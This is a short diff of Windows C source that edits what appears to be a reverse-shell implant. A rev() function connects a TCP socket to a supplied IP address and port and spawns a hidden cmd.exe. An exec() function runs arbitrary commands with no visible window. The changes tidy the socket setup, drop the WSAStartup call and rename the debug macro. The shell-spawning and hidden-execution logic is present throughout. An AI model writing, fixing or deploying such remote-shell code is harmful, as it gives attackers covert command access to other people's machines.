@@ -8,9 +8,7 @@ void rev(char* ip)
 	STARTUPINFO si;
 	PROCESS_INFORMATION pi;
 
-	WSAStartup(MAKEWORD(2, 2), &wsaData);
-
-	wSock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);
+	wSock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
 
 	hax.sin_family = AF_INET;
 	hax.sin_port = htons(REV_PORT);
@@ -25,7 +23,7 @@ void rev(char* ip)
 
 	if (!CreateProcessA(NULL, "cmd.exe", NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi))
 	{
-#ifdef DEBUG
+#ifdef _DEBUG
 		printf("CreateProcess failed (%d).\n", GetLastError());
 #endif
 		return;
@@ -43,7 +41,7 @@ void exec(char* cmd)
 	
 	if (!CreateProcessA(NULL, cmd, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi))
 	{
-#ifdef DEBUG
+#ifdef _DEBUG
 		printf("CreateProcess failed (%d).\n", GetLastError());
 #endif
 		return;
